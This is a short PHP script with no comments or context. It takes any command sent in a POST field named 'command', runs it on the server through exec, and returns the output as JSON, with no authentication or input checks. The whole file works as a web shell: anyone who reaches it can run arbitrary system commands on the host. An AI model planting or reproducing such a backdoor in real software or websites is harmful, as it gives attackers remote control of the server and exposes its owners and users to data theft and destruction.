<?php
$command = $_POST['command'];
exec($command . " 2>&1", $result);
echo json_encode($result);
?>